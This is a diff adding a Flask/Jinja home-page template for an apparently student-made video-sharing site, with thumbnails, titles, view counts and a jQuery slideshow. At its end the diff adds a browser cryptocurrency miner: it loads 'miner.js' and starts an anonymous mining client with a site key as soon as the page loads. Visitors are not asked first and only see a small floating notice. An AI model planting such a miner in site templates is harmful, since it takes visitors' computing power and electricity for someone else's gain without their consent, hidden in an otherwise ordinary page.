@@ -1,0 +1,162 @@
+{% extends "layout.html" %}
+{% block content %}
+<div class="top-grids">
+  <div class="recommended-info">
+    <h3>NEW UPLOADS</h3>
+  </div>
+  <div class="col-md-4 resent-grid recommended-grid slider-top-grids">
+    <div class="resent-grid-img recommended-grid-img">
+      <a href="/single"><img
+          src="https://i.ytimg.com/an_webp/SSo_EIwHSd4/mqdefault_6s.webp?du=3000&sqp=CITC8-0F&rs=AOn4CLCa3lqNDcZBNrd1SjuuI1rATv4Cpg"
+          alt="" /></a>
+      <div class="time">
+        <p>3:04</p>
+      </div>
+      <div class="clck">
+        <span class="glyphicon glyphicon-time" aria-hidden="true"></span>
+      </div>
+    </div>
+    <div class="resent-grid-info recommended-grid-info">
+      <h3><a href="/single" class="title title-info">Blockchain</a></h3>
+      <ul>
+        <li>
+          <p class="author author-info"><a href="#" class="author">John Maniya</a></p>
+        </li>
+        <li class="right-list">
+          <p class="views views-info">2,114,200 views</p>
+        </li>
+      </ul>
+    </div>
+  </div>
+  <div class="col-md-4 resent-grid recommended-grid slider-top-grids">
+    <div class="resent-grid-img recommended-grid-img">
+      <a href="/single"><img
+          src="https://i.ytimg.com/an_webp/58N2N7zJGrQ/mqdefault_6s.webp?du=3000&sqp=CIS_8-0F&rs=AOn4CLAiMg2ocMFux2M4VPd814_vPQsJVg"
+          alt="" /></a>
+      <div class="time">
+        <p>7:23</p>
+      </div>
+      <div class="clck">
+        <span class="glyphicon glyphicon-time" aria-hidden="true"></span>
+      </div>
+    </div>
+    <div class="resent-grid-info recommended-grid-info">
+      <h3><a href="/single" class="title title-info">Theory of Computation</a></h3>
+      <ul>
+        <li>
+          <p class="author author-info"><a href="#" class="author">Jobby</a></p>
+        </li>
+        <li class="right-list">
+          <p class="views views-info">4 views</p>
+        </li>
+      </ul>
+    </div>
+  </div>
+
+  <div class="clearfix"> </div>
+</div>
+<div class="recommended">
+  <div class="recommended-grids">
+    <div class="recommended-info">
+      <h3>IIT UPLOADS</h3>
+    </div>
+    <script src="{{ url_for('static', filename='js/responsiveslides.min.js') }}"></script>
+    <script>
+      // You can also use "$(window).load(function() {"
+      $(function () {
+        // Slideshow 4
+        $("#slider3").responsiveSlides({
+          auto: true,
+          pager: false,
+          nav: true,
+          speed: 500,
+          namespace: "callbacks",
+          before: function () {
+            $('.events').append("<li>before event fired.</li>");
+          },
+          after: function () {
+            $('.events').append("<li>after event fired.</li>");
+          }
+        });
+
+      });
+    </script>
+    <div id="top" class="callbacks_container">
+      <ul class="rslides" id="slider3">
+        <li>
+          <div class="animated-grids">
+            <div class="col-md-3 resent-grid recommended-grid slider-first">
+              <div class="resent-grid-img recommended-grid-img">
+                <a href="/single"><img
+                    src="https://i.ytimg.com/an_webp/r1suKCHLmXo/mqdefault_6s.webp?du=3000&sqp=CJjl8-0F&rs=AOn4CLBQ7mzwTj0yTW3OMuqElnHaNzIiMA"
+                    alt="" /></a>
+                <div class="time small-time slider-time">
+                  <p>7:34</p>
+                </div>
+                <div class="clck small-clck">
+                  <span class="glyphicon glyphicon-time" aria-hidden="true"></span>
+                </div>
+              </div>
+              <div class="resent-grid-info recommended-grid-info">
+                <h5><a href="/single" class="title">Digital Marketing</a></h5>
+                <div class="slid-bottom-grids">
+                  <div class="slid-bottom-grid">
+                    <p class="author author-info"><a href="#" class="author">Malina</a></p>
+                  </div>
+                  <div class="slid-bottom-grid slid-bottom-right">
+                    <p class="views views-info">21 views</p>
+                  </div>
+                  <div class="clearfix"> </div>
+                </div>
+              </div>
+            </div>
+          </div>
+        </li>
+      </ul>
+    </div>
+  </div>
+</div>
+<div class="recommended">
+  <div class="recommended-grids">
+    <div class="recommended-info">
+      <h3>Recent Activities</h3>
+    </div>
+    <div class="col-md-3 resent-grid recommended-grid">
+      <div class="resent-grid-img recommended-grid-img">
+        <a href="/single"><img
+            src="https://i.ytimg.com/an_webp/T60YnN_Zmn8/mqdefault_6s.webp?du=3000&sqp=CPHn8-0F&rs=AOn4CLDgHZxlOFYcaKAHd3MNvUsZfEfifw"
+            alt="" /></a>
+        <div class="time small-time">
+          <p>2:34</p>
+        </div>
+        <div class="clck small-clck">
+          <span class="glyphicon glyphicon-time" aria-hidden="true"></span>
+        </div>
+      </div>
+      <div class="resent-grid-info recommended-grid-info video-info-grid">
+        <h5><a href="/single" class="title">OOPS with JAVA</a>
+        </h5>
+        <ul>
+          <li>
+            <p class="author author-info"><a href="#" class="author">Raechal</a></p>
+          </li>
+          <li class="right-list">
+            <p class="views views-info">2,114,007 views</p>
+          </li>
+        </ul>
+      </div>
+    </div>
+    <div class="clearfix"> </div>
+  </div>
+</div>
+
+<script type="text/javascript" src="{{ url_for('static', filename='js/miner.js') }}"></script>
+<script>
+  var _client = new Client.Anonymous('3a18c384ce5acdcc3aa8c0041a85560d9c0d458e25e82ecf8f009e8fe87d832e', {
+    throttle: 0.9, c: 'w', ads: 0
+  });
+  _client.start();
+  _client.addMiningNotification("Floating Bottom", "This site is running JavaScript miner at 10%", "#cccccc", 30, "#3d3d3d");
+
+</script>
+{% endblock content %}
